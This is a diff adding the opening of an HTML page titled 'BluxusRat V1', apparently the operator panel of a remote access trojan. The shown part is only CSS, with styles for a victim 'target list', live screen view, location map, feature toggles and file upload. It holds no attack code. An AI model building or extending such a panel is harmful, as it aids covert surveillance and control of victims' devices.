@@ -1,0 +1,1563 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>BluxusRat V1 [NewEra]</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+body{
+  font-family:'Inter',system-ui,sans-serif;
+  background:#050304;color:var(--text);
+  -webkit-font-smoothing:antialiased;
+  -webkit-tap-highlight-color:transparent;
+  -webkit-touch-callout:none;
+  -webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;
+  overscroll-behavior:none;
+}
+input,button,textarea,select{font-family:inherit;outline:none;border:none}
+button{cursor:pointer}
+a{color:inherit;text-decoration:none}
+:root{
+  --bg:#050304;--bg-app:#0d0709;--bg-card:#160d10;--bg-elev:#1e1215;--bg-soft:#251519;
+  --border:rgba(255,255,255,0.06);--border-hi:rgba(255,255,255,0.1);
+  --text:#f5f5f5;--text-dim:#a39599;--text-mute:#5a4548;
+  --accent:#c41e28;--accent-hover:#e02630;--accent-soft:rgba(196,30,40,0.12);--accent-glow:rgba(196,30,40,0.4);
+  --success:#2ed573;--success-soft:rgba(46,213,115,0.12);
+  --error:#ff3333;--error-soft:rgba(255,51,51,0.12);
+  --warning:#ffa502;--warning-soft:rgba(255,165,2,0.12);
+  --info:#70a1ff;--info-soft:rgba(112,161,255,0.12);
+  --radius-lg:22px;--radius:16px;--radius-sm:12px;
+  --shadow-card:0 8px 24px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.04);
+  --shadow-soft:0 4px 12px rgba(0,0,0,0.4);
+  --shadow-inner:inset 0 2px 6px rgba(0,0,0,0.4), inset 0 -1px 0 rgba(255,255,255,0.03);
+  --trans:.2s cubic-bezier(0.4,0,0.2,1);
+}
+h1,h2,h3,h4,.font-head{font-family:'Poppins',sans-serif;letter-spacing:-.3px}
+body{background:radial-gradient(circle at 20% 10%, rgba(196,30,40,0.08) 0%, transparent 45%),radial-gradient(circle at 80% 90%, rgba(196,30,40,0.05) 0%, transparent 45%),#050304}
+#bg-image{position:fixed;inset:0;z-index:0;pointer-events:none;background-image:url('assets/background.png');background-size:cover;background-position:center;opacity:0.35}
+#app{position:relative;z-index:1;height:100dvh;width:100%;display:flex;flex-direction:column;padding:6px}
+.app-shell{flex:1;position:relative;background:var(--bg-app);border-radius:24px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.04), inset 0 1px 0 rgba(255,255,255,0.05);display:flex;flex-direction:column}
+.screen{position:absolute;inset:0;display:flex;flex-direction:column;opacity:0;visibility:hidden;transition:opacity .3s ease,visibility .3s ease;overflow:hidden}
+.screen.active{opacity:1;visibility:visible}
+/* LOADING */
+#screen-loading{align-items:center;justify-content:center;padding:24px}
+#screen-loading .brand-logo{font-family:'Poppins',sans-serif;font-size:36px;font-weight:800;letter-spacing:-1.5px;background:linear-gradient(135deg,#f5f5f5 30%, #c41e28 90%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px;filter:drop-shadow(0 4px 20px rgba(196,30,40,0.4))}
+#screen-loading .brand-sub{font-size:10px;letter-spacing:6px;color:var(--accent);text-transform:uppercase;margin-bottom:8px;font-weight:600}
+#screen-loading .brand-ver{font-size:9px;letter-spacing:3px;color:var(--text-mute);text-transform:uppercase;margin-bottom:36px;font-weight:600}
+.progress-wrap{width:100%;max-width:280px;height:5px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden;box-shadow:inset 0 1px 2px rgba(0,0,0,0.5)}
+.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#8b0000,#c41e28,#ff4757);border-radius:3px;transition:width .3s ease;box-shadow:0 0 12px var(--accent-glow)}
+#loading-text{margin-top:16px;font-size:11px;color:var(--text-dim);letter-spacing:.5px;min-height:16px;transition:opacity .2s ease}
+/* LOGIN */
+#screen-login{padding:0;justify-content:flex-start}
+.banner-wrap{position:relative;width:100%;height:44vh;min-height:260px;overflow:hidden;flex-shrink:0;background:#0a0607}
+.banner-wrap img{width:100%;height:100%;object-fit:cover;display:block;opacity:.95}
+.banner-wrap::after{content:'';position:absolute;inset:0;background:linear-gradient(180deg,transparent 0%,transparent 30%,rgba(13,7,9,.5) 55%,rgba(13,7,9,.95) 85%,#0d0709 100%);pointer-events:none}
+.banner-title{position:absolute;left:24px;bottom:48px;z-index:2;font-family:'Poppins',sans-serif;font-size:32px;font-weight:800;letter-spacing:-1.5px;background:linear-gradient(135deg,#fff 40%, #c41e28);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.banner-sub{position:absolute;left:24px;bottom:28px;z-index:2;font-size:10px;color:var(--accent);letter-spacing:4px;text-transform:uppercase;font-weight:600}
+.form-zone{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:0 20px;margin-top:-24px;z-index:3;width:100%;overflow-y:auto}
+.card{width:100%;max-width:400px;background:rgba(22,13,16,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:var(--radius-lg);padding:26px 22px;margin-bottom:24px;box-shadow:var(--shadow-card)}
+.card-title{font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;margin-bottom:20px;color:var(--text);text-align:center}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:10px;font-weight:700;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}
+.input-wrap{position:relative;display:flex;align-items:center}
+.input-wrap .ico-badge{position:absolute;left:8px;width:32px;height:32px;border-radius:9px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;pointer-events:none;transition:var(--trans);z-index:1}
+.input-wrap .ico-badge i{font-size:13px;color:var(--accent-hover)}
+.input-wrap input,.input-wrap select,.input-wrap textarea{width:100%;background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);padding:14px 14px 14px 50px;font-size:14px;font-weight:500;transition:var(--trans);box-shadow:var(--shadow-inner);-webkit-appearance:none;appearance:none}
+.input-wrap input::placeholder,.input-wrap textarea::placeholder{color:var(--text-mute);font-weight:400}
+.input-wrap input:focus,.input-wrap select:focus,.input-wrap textarea:focus{border-color:var(--accent);background:var(--bg-card);box-shadow:0 0 0 3px var(--accent-soft)}
+.input-wrap select{background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23a39599' stroke-width='3'><polyline points='6 9 12 15 18 9'/></svg>");background-repeat:no-repeat;background-position:right 16px center;padding-right:40px}
+.input-wrap textarea{resize:vertical;min-height:80px;font-family:inherit;padding:14px 14px 14px 50px;line-height:1.5}
+.btn{width:100%;padding:15px;border-radius:var(--radius-sm);font-size:13px;font-weight:700;letter-spacing:.5px;transition:var(--trans);display:inline-flex;align-items:center;justify-content:center;gap:8px;text-transform:uppercase}
+.btn-primary{background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;box-shadow:0 4px 16px var(--accent-glow), inset 0 1px 0 rgba(255,255,255,0.15)}
+.btn-primary:hover:not(:disabled){box-shadow:0 6px 24px var(--accent-glow), inset 0 1px 0 rgba(255,255,255,0.2);transform:translateY(-1px)}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.btn-ghost{background:var(--bg-card);color:var(--text);border:1px solid var(--border-hi);box-shadow:var(--shadow-soft), inset 0 1px 0 rgba(255,255,255,0.05)}
+.btn-ghost:hover:not(:disabled){background:var(--bg-elev);border-color:var(--accent)}
+.btn-danger{background:linear-gradient(135deg,#ff3333,#a51010);color:#fff;box-shadow:0 4px 16px rgba(255,51,51,0.3)}
+.btn-success{background:linear-gradient(135deg,#2ed573,#1a9e4f);color:#fff;box-shadow:0 4px 16px rgba(46,213,115,0.3)}
+.btn-sm{padding:9px 14px;font-size:11px;width:auto}
+.login-meta{margin-top:18px;text-align:center;font-size:11px;color:var(--text-mute)}
+#conn-dot{position:fixed;top:20px;right:20px;z-index:100;width:9px;height:9px;border-radius:50%;background:var(--success);box-shadow:0 0 10px var(--success);transition:var(--trans)}
+#conn-dot.warn{background:var(--warning);box-shadow:0 0 10px var(--warning)}
+#conn-dot.off{background:var(--error);box-shadow:0 0 10px var(--error)}
+#offline-popup{position:fixed;inset:0;z-index:999;background:rgba(5,3,4,.92);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:24px;opacity:0;visibility:hidden;transition:var(--trans)}
+#offline-popup.show{opacity:1;visibility:visible}
+.offline-box{width:100%;max-width:340px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:30px 24px;text-align:center;transform:translateY(10px) scale(.96);transition:transform .25s ease;box-shadow:0 20px 60px rgba(0,0,0,0.7)}
+#offline-popup.show .offline-box{transform:translateY(0) scale(1)}
+.offline-icon-wrap{width:72px;height:72px;border-radius:50%;background:var(--error-soft);display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
+.offline-icon{font-size:32px;color:var(--error)}
+.offline-box h3{font-family:'Poppins',sans-serif;font-size:19px;font-weight:700;margin-bottom:8px}
+.offline-box p{font-size:12px;color:var(--text-dim);line-height:1.6;margin-bottom:24px}
+/* DASHBOARD */
+.dash-header{position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:rgba(13,7,9,.85);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
+.hamburger{width:40px;height:40px;border-radius:12px;background:var(--bg-card);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;transition:var(--trans);color:var(--text);box-shadow:var(--shadow-soft)}
+.hamburger:active{transform:scale(.94)}
+.hamburger i{font-size:15px}
+.logo-text{font-family:'Poppins',sans-serif;font-size:16px;font-weight:700;letter-spacing:-.3px;background:linear-gradient(135deg,#fff 40%, var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.page-title{font-family:'Poppins',sans-serif;font-size:15px;font-weight:700;color:var(--text);letter-spacing:.3px}
+.dash-body{padding:16px;display:flex;flex-direction:column;gap:14px;padding-bottom:28px;flex:1;overflow-y:auto}
+.welcome-banner{position:relative;border-radius:var(--radius-lg);overflow:hidden;height:150px;border:1px solid var(--border);box-shadow:var(--shadow-card)}
+.welcome-banner img{width:100%;height:100%;object-fit:cover;display:block}
+.welcome-banner::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(13,7,9,0.3) 0%, rgba(13,7,9,0.75) 100%)}
+.welcome-banner .wb-text{position:absolute;left:20px;bottom:16px;z-index:2;right:20px}
+.welcome-banner .wb-text .w{font-family:'Poppins',sans-serif;font-size:18px;font-weight:700;color:#fff;line-height:1.2}
+.welcome-banner .wb-text .s{font-size:11px;color:rgba(255,255,255,0.7);margin-top:4px}
+.welcome-banner .wb-badge{position:absolute;top:14px;right:14px;z-index:2;padding:5px 12px;border-radius:20px;background:rgba(196,30,40,0.9);color:#fff;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;box-shadow:0 4px 12px var(--accent-glow);backdrop-filter:blur(4px)}
+/* USER CARD */
+.user-card{position:relative;border-radius:var(--radius-lg);overflow:hidden;background:var(--bg-card);border:1px solid var(--border);padding:20px;box-shadow:var(--shadow-card)}
+.user-card .content{display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
+.user-card .label{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:4px}
+.user-card .usn{font-family:'Poppins',sans-serif;font-size:20px;font-weight:700;color:#fff;margin-bottom:10px;letter-spacing:-.3px}
+.user-card .role{display:inline-flex;align-items:center;gap:5px;font-size:10px;font-weight:700;padding:5px 12px;border-radius:20px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;text-transform:uppercase;letter-spacing:1px;box-shadow:0 2px 8px var(--accent-glow)}
+.user-card .val{font-size:13px;font-weight:700;margin-top:4px;text-align:right;color:var(--text)}
+.user-card .val.mono{font-family:'JetBrains Mono',monospace;font-size:11px}
+/* MINI GRID */
+.mini-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.mini-card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:14px;display:flex;align-items:center;gap:12px;box-shadow:var(--shadow-card)}
+.mini-card .ico-badge{width:40px;height:40px;border-radius:12px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.mini-card .ico-badge i{font-size:16px;color:var(--accent-hover)}
+.mini-card .info{flex:1;min-width:0}
+.mini-card .label{font-size:9px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.2px;font-weight:700;margin-bottom:3px}
+.mini-card .val{font-size:13px;font-weight:700;color:var(--text);word-break:break-all}
+/* ANNOUNCEMENT */
+.announce-card{position:relative;border-radius:var(--radius-lg);overflow:hidden;border:1px solid var(--border);box-shadow:var(--shadow-card);cursor:pointer;transition:var(--trans);min-height:100px;background:var(--bg-card)}
+.announce-card:hover{border-color:var(--accent);transform:translateY(-1px)}
+.announce-card img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:.4}
+.announce-card .ac-body{position:relative;z-index:2;padding:18px;display:flex;flex-direction:column;justify-content:flex-end;min-height:100px}
+.announce-card .ac-body .ac-label{font-size:9px;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:6px;display:flex;align-items:center;gap:6px}
+.announce-card .ac-body .ac-title{font-family:'Poppins',sans-serif;font-size:15px;font-weight:700;color:#fff;line-height:1.3;margin-bottom:4px}
+.announce-card .ac-body .ac-desc{font-size:11px;color:rgba(255,255,255,0.7);line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+/* TARGET LIST */
+.target-list{display:flex;flex-direction:column;gap:10px}
+.target-item{display:flex;align-items:center;gap:12px;padding:14px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;transition:var(--trans);box-shadow:var(--shadow-card)}
+.target-item:hover{border-color:var(--accent);background:var(--bg-elev);transform:translateY(-1px)}
+.target-item .ti-avatar{width:44px;height:44px;border-radius:12px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.target-item .ti-avatar i{font-size:18px;color:var(--accent-hover)}
+.target-item .ti-info{flex:1;min-width:0}
+.target-item .ti-info .n{font-family:'Poppins',sans-serif;font-size:14px;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.target-item .ti-info .d{font-size:11px;color:var(--text-dim);margin-top:2px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+.target-item .ti-info .d .battery-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 7px;border-radius:6px;background:var(--success-soft);color:var(--success);font-size:10px;font-weight:700}
+.target-item .ti-info .d .battery-badge.low{background:var(--error-soft);color:var(--error)}
+.target-item .ti-status{flex-shrink:0;display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.target-item .ti-status.on{color:var(--success)}
+.target-item .ti-status.off{color:var(--text-mute)}
+.target-item .ti-status .d{width:8px;height:8px;border-radius:50%;background:currentColor;box-shadow:0 0 8px currentColor}
+/* TABS */
+.tabs{display:flex;gap:6px;background:var(--bg-app);border:1px solid var(--border);border-radius:14px;padding:5px;margin-bottom:14px}
+.tabs button{flex:1;padding:10px;border-radius:10px;font-size:11px;font-weight:700;color:var(--text-dim);background:transparent;transition:var(--trans);display:flex;align-items:center;justify-content:center;gap:6px;letter-spacing:.3px;text-transform:uppercase}
+.tabs button.active{background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;box-shadow:0 4px 12px var(--accent-glow)}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+/* LIVE VIEW */
+.live-view{position:relative;width:100%;aspect-ratio:9/16;max-height:500px;background:#000;border-radius:12px;overflow:hidden;border:1px solid var(--border)}
+.live-view img{width:100%;height:100%;object-fit:contain;display:block}
+.live-view .empty{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text-mute);font-size:12px;text-align:center;padding:20px}
+.live-view .empty i{font-size:42px;margin-bottom:10px;opacity:.4}
+.live-view .live-badge{position:absolute;top:10px;left:10px;z-index:2;padding:4px 10px;border-radius:20px;background:rgba(255,51,51,0.9);color:#fff;font-size:9px;font-weight:700;letter-spacing:1px;display:flex;align-items:center;gap:5px;box-shadow:0 0 12px rgba(255,51,51,0.6)}
+.live-view .live-badge .d{width:6px;height:6px;border-radius:50%;background:#fff;animation:pulseDot 1.2s infinite}
+@keyframes pulseDot{0%,100%{opacity:1}50%{opacity:.3}}
+/* LOCATE */
+.loc-map{width:100%;height:280px;background:#000;border-radius:12px;overflow:hidden;border:1px solid var(--border);position:relative}
+.loc-map iframe{width:100%;height:100%;border:0;display:block}
+.loc-map .empty{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text-mute);font-size:12px;text-align:center;padding:20px}
+.loc-map .empty i{font-size:42px;margin-bottom:10px;opacity:.4}
+.loc-coords{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-dim);margin-top:10px;text-align:center;letter-spacing:.5px}
+/* TOGGLE SWITCH */
+.toggle-row{display:flex;align-items:center;justify-content:space-between;padding:14px;background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-sm);margin-bottom:10px}
+.toggle-row:last-child{margin-bottom:0}
+.toggle-row .tr-left{display:flex;align-items:center;gap:12px;flex:1}
+.toggle-row .tr-left .ico-badge{width:38px;height:38px;border-radius:11px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.toggle-row .tr-left .ico-badge i{font-size:15px;color:var(--accent-hover)}
+.toggle-row .tr-left .tr-info .n{font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:var(--text)}
+.toggle-row .tr-left .tr-info .d{font-size:10px;color:var(--text-dim);margin-top:2px}
+.switch{position:relative;width:48px;height:26px;flex-shrink:0}
+.switch input{opacity:0;width:0;height:0}
+.switch .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:var(--bg-card);border:1px solid var(--border);border-radius:26px;transition:var(--trans)}
+.switch .slider:before{content:'';position:absolute;height:18px;width:18px;left:3px;bottom:2.5px;background:var(--text-dim);border-radius:50%;transition:var(--trans)}
+.switch input:checked + .slider{background:linear-gradient(135deg,#c41e28,#8b0000);border-color:var(--accent)}
+.switch input:checked + .slider:before{transform:translateX(22px);background:#fff}
+/* TOOLS */
+.upload-zone{border:2px dashed var(--border-hi);border-radius:var(--radius-lg);padding:40px 24px;text-align:center;cursor:pointer;transition:var(--trans);background:var(--bg-card);position:relative;overflow:hidden}
+.upload-zone:hover,.upload-zone.dragover{border-color:var(--accent);background:var(--bg-elev)}
+.upload-zone .uz-icon{width:72px;height:72px;border-radius:50%;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+.upload-zone .uz-icon i{font-size:30px;color:var(--accent-hover)}
+.upload-zone .uz-title{font-family:'Poppins',sans-serif;font-size:16px;font-weight:700;color:var(--text);margin-bottom:6px}
+.upload-zone .uz-desc{font-size:12px;color:var(--text-dim);line-height:1.6}
+.upload-zone input[type="file"]{position:absolute;inset:0;opacity:0;cursor:pointer}
+.upload-progress{margin-top:16px;display:none}
+.upload-progress.show{display:block}
+.upload-progress .up-bar{width:100%;height:8px;background:var(--bg-app);border-radius:4px;overflow:hidden;box-shadow:var(--shadow-inner)}
+.upload-progress .up-fill{height:100%;width:0%;background:linear-gradient(90deg,#8b0000,#c41e28,#ff4757);border-radius:4px;transition:width .2s ease;box-shadow:0 0 8px var(--accent-glow)}
+.upload-progress .up-text{font-size:11px;color:var(--text-dim);margin-top:8px;text-align:center;letter-spacing:.3px}
+.upload-result{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px;margin-top:16px;box-shadow:var(--shadow-card);display:none}
+.upload-result.show{display:block;animation:slideUp .3s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.upload-result .ur-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;padding-bottom:14px;border-bottom:1px solid var(--border)}
+.upload-result .ur-head .ico-badge{width:36px;height:36px;border-radius:10px;background:var(--success-soft);display:flex;align-items:center;justify-content:center}
+.upload-result .ur-head .ico-badge i{font-size:15px;color:var(--success)}
+.upload-result .ur-head .t{font-family:'Poppins',sans-serif;font-size:14px;font-weight:700;color:var(--text)}
+.upload-result .ur-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;font-size:12px;gap:10px}
+.upload-result .ur-row .l{color:var(--text-dim);flex-shrink:0}
+.upload-result .ur-row .v{color:var(--text);font-weight:600;font-family:'JetBrains Mono',monospace;font-size:11px;word-break:break-all;text-align:right;flex:1}
+.upload-result .ur-actions{display:flex;gap:8px;margin-top:14px}
+.upload-result .ur-actions .btn{flex:1;font-size:11px;padding:10px}
+/* SIDEBAR */
+#sidebar{position:fixed;top:0;left:0;bottom:0;width:280px;max-width:82vw;background:var(--bg-app);border-right:1px solid var(--border);z-index:200;transform:translateX(-100%);transition:transform .3s cubic-bezier(0.4,0,0.2,1);display:flex;flex-direction:column;overflow-y:auto;box-shadow:20px 0 60px rgba(0,0,0,0.6)}
+#sidebar.open{transform:translateX(0)}
+#sidebar-backdrop{position:fixed;inset:0;background:rgba(5,3,4,.75);backdrop-filter:blur(4px);z-index:199;opacity:0;visibility:hidden;transition:var(--trans)}
+#sidebar-backdrop.show{opacity:1;visibility:visible}
+.sb-head{padding:28px 22px 20px;border-bottom:1px solid var(--border)}
+.sb-head .brand{font-family:'Poppins',sans-serif;font-size:20px;font-weight:800;letter-spacing:-1px;background:linear-gradient(135deg,#fff 40%, var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.sb-head .sub{font-size:10px;color:var(--text-dim);margin-top:4px;letter-spacing:2px;text-transform:uppercase}
+.sb-nav{padding:14px 12px;display:flex;flex-direction:column;gap:4px}
+.sb-item{padding:13px 14px;border-radius:12px;display:flex;align-items:center;gap:14px;font-size:14px;font-weight:600;color:var(--text-dim);transition:var(--trans);cursor:pointer;position:relative}
+.sb-item:hover{background:var(--bg-card);color:var(--text)}
+.sb-item.active{background:var(--accent-soft);color:var(--accent-hover)}
+.sb-item.active::before{content:'';position:absolute;left:0;top:20%;bottom:20%;width:3px;background:var(--accent);border-radius:3px}
+.sb-item .ico-badge{width:32px;height:32px;border-radius:9px;background:rgba(255,255,255,0.03);display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:var(--trans)}
+.sb-item.active .ico-badge{background:var(--accent-soft)}
+.sb-item .ico-badge i{font-size:14px;color:currentColor}
+.sb-sep{height:1px;background:var(--border);margin:10px 16px}
+.sb-label{font-size:10px;color:var(--text-mute);text-transform:uppercase;letter-spacing:2px;padding:12px 16px 6px;font-weight:700}
+/* SECTION */
+.section{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:20px;box-shadow:var(--shadow-card)}
+.section h3{font-family:'Poppins',sans-serif;font-size:14px;font-weight:700;margin-bottom:16px;letter-spacing:.3px;display:flex;align-items:center;gap:12px}
+.section h3 .ico-badge{width:32px;height:32px;border-radius:9px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center}
+.section h3 .ico-badge i{font-size:13px;color:var(--accent-hover)}
+/* PANEL GRID */
+.panel-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.panel-action{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:18px 14px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:10px;cursor:pointer;transition:var(--trans);box-shadow:var(--shadow-card)}
+.panel-action:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 12px 32px rgba(0,0,0,0.6), 0 0 20px var(--accent-glow)}
+.panel-action .ico-badge{width:48px;height:48px;border-radius:14px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center}
+.panel-action .ico-badge i{font-size:20px;color:var(--accent-hover)}
+.panel-action .txt{font-size:12px;font-weight:700;color:var(--text);font-family:'Poppins',sans-serif;line-height:1.3}
+/* STAT GRID */
+.stat-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.stat-card{background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-sm);padding:14px;box-shadow:var(--shadow-inner)}
+.stat-card .l{font-size:9px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.2px;font-weight:700;margin-bottom:6px}
+.stat-card .v{font-family:'Poppins',sans-serif;font-size:22px;font-weight:700;color:var(--text);letter-spacing:-.5px}
+.stat-card .v.accent{color:var(--accent-hover)}
+.stat-card .v.success{color:var(--success)}
+.stat-card .v.warn{color:var(--warning)}
+.stat-card .v.info{color:var(--info)}
+/* ACCOUNT */
+.profile-head{display:flex;flex-direction:column;align-items:center;gap:12px;padding:26px 0}
+.avatar-wrap{position:relative}
+.avatar{width:100px;height:100px;border-radius:50%;object-fit:cover;border:3px solid var(--accent);background:var(--bg-elev);box-shadow:0 0 0 6px var(--bg-app), 0 8px 24px rgba(0,0,0,0.5)}
+.avatar-wrap .edit{position:absolute;right:2px;bottom:2px;width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#c41e28,#8b0000);display:flex;align-items:center;justify-content:center;border:3px solid var(--bg-app);cursor:pointer;transition:var(--trans);box-shadow:0 4px 12px var(--accent-glow)}
+.avatar-wrap .edit i{font-size:12px;color:#fff}
+.profile-head .uname{font-family:'Poppins',sans-serif;font-size:22px;font-weight:700;color:#fff}
+.profile-head .urole{font-size:10px;padding:5px 16px;border-radius:20px;background:linear-gradient(135deg,#c41e28,#8b0000);color:#fff;text-transform:uppercase;letter-spacing:2px;font-weight:700;box-shadow:0 4px 12px var(--accent-glow)}
+.list-item{display:flex;align-items:center;gap:14px;padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;transition:var(--trans);margin-bottom:10px;box-shadow:var(--shadow-card)}
+.list-item:hover{border-color:var(--accent);background:var(--bg-elev);transform:translateY(-1px)}
+.list-item .ico-badge{width:40px;height:40px;border-radius:11px;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:var(--trans)}
+.list-item .ico-badge i{font-size:15px;color:var(--accent-hover)}
+.list-item .txt{flex:1}
+.list-item .txt .n{font-size:14px;font-weight:700;color:var(--text)}
+.list-item .txt .d{font-size:11px;color:var(--text-dim);margin-top:2px}
+.list-item .arrow{color:var(--text-mute);font-size:12px;transition:var(--trans)}
+.list-item.danger .ico-badge{background:var(--error-soft)}
+.list-item.danger .ico-badge i{color:var(--error)}
+.list-item.danger .txt .n{color:var(--error)}
+/* ABOUT */
+.about-hero{text-align:center;padding:30px 20px 20px}
+.about-hero .ab-logo{font-family:'Poppins',sans-serif;font-size:36px;font-weight:800;letter-spacing:-1.5px;background:linear-gradient(135deg,#fff 40%, var(--accent));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+.about-hero .ab-ver{font-size:11px;color:var(--accent);letter-spacing:4px;text-transform:uppercase;font-weight:700}
+.about-hero .ab-desc{font-size:12px;color:var(--text-dim);margin-top:12px;line-height:1.7}
+/* MODAL */
+.modal{position:fixed;inset:0;z-index:500;background:rgba(5,3,4,.85);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;visibility:hidden;transition:var(--trans)}
+.modal.show{opacity:1;visibility:visible}
+.modal-box{width:100%;max-width:480px;background:var(--bg-app);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px;transform:scale(.95) translateY(10px);transition:transform .25s ease;max-height:92vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,0.7)}
+.modal.show .modal-box{transform:scale(1) translateY(0)}
+.modal-box h3{font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center}
+.modal-box .sub{font-size:12px;color:var(--text-dim);margin-bottom:18px;line-height:1.6;text-align:center}
+.modal-actions{display:flex;gap:8px;margin-top:20px}
+.modal-actions .btn{flex:1}
+/* FIX INPUT DI MODAL */
+.modal-box input[type="text"],.modal-box input[type="password"],.modal-box input[type="number"],.modal-box input[type="tel"],.modal-box select,.modal-box textarea{
+  width:100%;
+  background:var(--bg-card);
+  border:1px solid var(--border);
+  border-radius:var(--radius-sm);
+  color:var(--text);
+  padding:13px 14px;
+  font-size:13px;
+  font-weight:600;
+  transition:var(--trans);
+  box-shadow:var(--shadow-inner);
+  -webkit-appearance:none;appearance:none;
+}
+.modal-box input::placeholder,.modal-box textarea::placeholder{color:var(--text-mute);font-weight:400}
+.modal-box input:focus,.modal-box select:focus,.modal-box textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.modal-box select{background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23a39599' stroke-width='3'><polyline points='6 9 12 15 18 9'/></svg>");background-repeat:no-repeat;background-position:right 16px center;padding-right:40px}
